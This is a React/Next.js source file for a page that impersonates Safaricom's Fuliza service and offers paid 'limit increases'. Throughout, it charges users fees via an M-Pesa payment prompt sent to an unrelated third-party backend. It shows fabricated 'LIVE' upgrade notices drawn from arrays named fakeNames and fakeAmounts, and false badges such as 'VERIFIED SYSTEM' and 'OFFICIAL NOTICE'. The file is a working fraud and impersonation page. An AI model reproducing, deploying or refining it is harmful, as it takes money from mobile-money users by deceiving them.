"use client";

import React, { useEffect, useState } from "react";

type Limit = {
  id: string;
  amount: number;
  fee: number;
};

const limits: Limit[] = [
  { id: "l1", amount: 2000, fee: 150 },
  { id: "l2", amount: 5000, fee: 300 },
  { id: "l3", amount: 7000, fee: 500 },
  { id: "l4", amount: 10000, fee: 800 },
  { id: "l5", amount: 15000, fee: 1200 },
  { id: "l6", amount: 20000, fee: 1500 },
  { id: "l7", amount: 30000, fee: 2000 },
  { id: "l8", amount: 40000, fee: 2500 },
  { id: "l9", amount: 50000, fee: 3000 },
];

const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
const fakeAmounts = [12000, 18000, 24000, 32000, 50000];

const BACKEND_URL =
  process.env.NEXT_PUBLIC_BACKEND_URL ||
  "https://starlink-backend-yb3n.onrender.com";

export default function FulizaPortal() {
  const [selected, setSelected] = useState<Limit | null>(null);
  const [phone, setPhone] = useState("");
  const [open, setOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [recent, setRecent] = useState({ name: "", amount: 0 });
  const [error, setError] = useState("");

  const normalizePhone = (num: string) => {
    let phone = num.replace(/\D/g, "");
    if (phone.startsWith("07") || phone.startsWith("01")) {
      return "254" + phone.slice(1);
    }
    if (phone.startsWith("254")) return phone;
    return phone;
  };

  useEffect(() => {
    const update = () => {
      setRecent({
        name: fakeNames[Math.floor(Math.random() * fakeNames.length)],
        amount: fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)],
      });
    };

    update();
    const t = setInterval(update, 2000);
    return () => clearInterval(t);
  }, []);

  const validate = () => {
    const normalized = normalizePhone(phone);

    if (!/^254(7|1)\d{8}$/.test(normalized)) {
      setError("Enter a valid Safaricom number");
      return false;
    }

    setError("");
    return true;
  };

  const submit = async () => {
    if (!selected) return;
    if (!validate()) return;

    setLoading(true);

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone: normalizePhone(phone),
          amount: selected.fee,
          local_id: `F${Date.now().toString(36)}`,
          transaction_desc: `Fuliza limit increase to Ksh ${selected.amount}`,
          till_id: 1,
        }),
      });

      const data = await res.json();
      if (data.status) setDone(true);
    } catch (err) {
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-green-50 text-black">

      {/* HEADER */}
      <div className="border-b-4 border-green-800 bg-green-700 text-white">
        <div className="max-w-5xl mx-auto px-6 py-4 flex justify-between items-center">

          <div>
            <h1 className="text-lg font-extrabold tracking-wide">
              FULIZA OFFICIAL
            </h1>
            <p className="text-xs text-green-200 font-medium">
              LIMIT INCREASE PROGRAM
            </p>
          </div>

          <div className="text-xs bg-green-100 text-green-800 font-bold px-3 py-1 border-2 border-green-800">
            VERIFIED SYSTEM
          </div>
        </div>
      </div>

      {/* MAIN */}
      <div className="max-w-5xl mx-auto px-6 py-8 grid grid-cols-3 gap-8">

        {/* LEFT */}
        <div className="col-span-2 space-y-6">

          <div>
            <h2 className="text-2xl font-extrabold text-black">
              Fuliza Limit Upgrade Portal
            </h2>
            <p className="text-sm text-gray-700 mt-1">
              Apply for a higher Fuliza limit through our secure system.
              Increase your limit even when active.
            </p>
          </div>

          {/* LIVE */}
          <div className="border-l-4 border-green-600 pl-3 text-sm bg-green-100 py-2 pr-2">
            <span className="text-green-700 font-bold">
              {recent.name}
            </span>{" "}
            upgraded to{" "}
            <span className="font-extrabold">
              Ksh {recent.amount.toLocaleString()}
            </span>{" "}
            <span className="text-green-600 font-semibold">• LIVE</span>
          </div>

          {/* LIMITS */}
          <div>
            <h3 className="font-bold mb-3 text-black">
              Select Fuliza Increase Tier
            </h3>

            <div className="grid grid-cols-2 gap-3">
              {limits.map((l) => {
                const active = selected?.id === l.id;

                return (
                  <div
                    key={l.id}
                    onClick={() => setSelected(l)}
                    className={`cursor-pointer border-2 p-4 transition font-semibold ${
                      active
                        ? "bg-green-700 text-white border-green-900"
                        : "bg-green-50 text-black border-green-200 hover:border-green-600"
                    }`}
                  >
                    <div className="text-lg font-extrabold">
                      Ksh {l.amount.toLocaleString()}
                    </div>
                    <div className="text-xs">
                      Fee: Ksh {l.fee}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* BUTTON */}
          <button
            onClick={() => selected && setOpen(true)}
            className="bg-green-700 hover:bg-green-800 text-white px-6 py-3 font-bold text-sm border-2 border-green-900"
          >
            APPLY FOR INCREASE
          </button>
        </div>

        {/* RIGHT (UNCHANGED UI, COLORS ONLY) */}
        <div className="space-y-4">

          <div className="border-2 border-green-700 bg-green-100 p-4">
            <h3 className="font-bold text-sm mb-2">
              OFFICIAL NOTICE
            </h3>
            <p className="text-xs text-gray-700">
              This is a secure Fuliza system. All applications are reviewed digitally.
              Check via *234# after applying.
            </p>
          </div>

          <div className="border-2 border-green-700 bg-green-100 p-4">
            <h3 className="font-bold text-sm mb-2">
              REQUIREMENTS
            </h3>
            <ul className="text-xs text-gray-700 space-y-1">
              <li>• Valid Safaricom Number</li>
              <li>• Fuliza Active</li>
              <li>• One Request Per User</li>
            </ul>
          </div>

          <div className="border-2 border-green-600 bg-green-200 p-4">
            <h3 className="font-bold text-sm mb-2 text-green-800">
              PROCESSING
            </h3>
            <p className="text-xs text-green-800">
              Instant increase after confirmation.
            </p>
          </div>

        </div>
      </div>

      {/* MODAL (unchanged UI, colors adjusted) */}
      {open && selected && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center px-4">
          <div className="bg-green-50 w-full max-w-sm border-4 border-green-700">

            <div className="bg-green-700 text-white p-4">
              <h2 className="text-sm font-bold">
                FULIZA VERIFICATION
              </h2>
              <p className="font-extrabold text-lg">
                Ksh {selected.amount.toLocaleString()}
              </p>
            </div>

            <div className="p-5">
              {!done ? (
                <>
                  <p className="text-xs mb-3 text-gray-700">
                    Enter your Safaricom number to receive M-Pesa prompt.
                  </p>

                  <input
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    placeholder="07XXXXXXXX"
                    className="w-full border-2 border-green-300 px-3 py-2 text-sm focus:border-green-700 outline-none bg-white"
                  />

                  {error && (
                    <p className="text-red-600 text-xs mt-2">{error}</p>
                  )}

                  <div className="flex gap-3 mt-4">
                    <button
                      onClick={() => setOpen(false)}
                      className="w-1/2 border-2 border-gray-400 py-2 text-sm"
                    >
                      CANCEL
                    </button>

                    <button
                      onClick={submit}
                      className="w-1/2 bg-green-700 text-white py-2 text-sm font-bold border-2 border-green-900"
                    >
                      {loading
                        ? "PROCESSING..."
                        : `PAY Ksh ${selected.fee}`}
                    </button>
                  </div>
                </>
              ) : (
                <div className="text-center py-6 text-green-700 font-extrabold">
                  REQUEST SUBMITTED
                </div>
              )}
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
